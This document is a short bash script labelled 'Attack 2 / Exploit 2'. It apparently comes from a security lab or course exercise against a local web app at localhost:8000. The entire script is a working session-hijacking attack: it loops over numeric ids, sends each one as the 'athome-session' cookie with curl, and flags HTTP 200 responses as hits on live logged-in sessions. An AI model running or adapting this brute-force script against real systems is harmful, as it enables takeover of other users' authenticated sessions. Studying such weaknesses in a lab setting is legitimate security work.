#!/bin/bash
# Attack 2 / Exploit 2: scripted brute force of athome-session ids.
#
# Tries a small range of session ids as the athome-session cookie against
# GET / (the protected main page) and reports which ones are "hits" -
# i.e. which ones belong to a currently logged-in session.
#
# Usage: ./session_bruteforce.sh [low] [high]
#   defaults to trying ids 1 through 50

LOW="${1:-1}"
HIGH="${2:-50}"
TARGET="https://localhost:8000/"

echo "Brute forcing athome-session ids $LOW..$HIGH against $TARGET"
echo "----------------------------------------------------------"

for id in $(seq "$LOW" "$HIGH"); do
  code=$(curl -sk -o /tmp/bf_response.html -w "%{http_code}" \
    -H "Cookie: athome-session=$id" "$TARGET")

  if [ "$code" = "200" ]; then
    echo "HIT  id=$id  -> HTTP $code (authenticated page served)"
  else
    echo "miss id=$id  -> HTTP $code"
  fi
done

echo "----------------------------------------------------------"
echo "Done."
